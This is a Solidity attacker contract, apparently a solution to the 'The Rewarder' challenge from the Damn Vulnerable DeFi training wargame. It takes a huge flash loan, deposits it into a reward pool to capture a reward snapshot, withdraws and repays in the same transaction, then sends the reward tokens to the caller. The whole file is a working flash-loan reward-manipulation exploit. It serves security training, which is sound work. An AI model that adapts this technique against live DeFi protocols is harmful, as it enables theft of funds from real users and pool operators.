// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "hardhat/console.sol";
import { RewardToken } from "./RewardToken.sol";

contract TheRewarderAttacker {

    FlashLoanerPool flashLoanerPool;
    TheRewarderPool rewarderPool;

    constructor(address _flashLoanerPool, address _rewarderPool) {
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        rewarderPool = TheRewarderPool(_rewarderPool);
    }

    function attack() public {
        flashLoanerPool.flashLoan(1000000 ether);
        RewardToken rewardToken = rewarderPool.rewardToken();
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) public {
        DamnValuableToken liquidityToken = flashLoanerPool.liquidityToken();
        // Receive flashloan -> deposit to rewarder pool -> withdraw from rewarder pool -> return flashloan.
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanerPool), amount);
    }

}
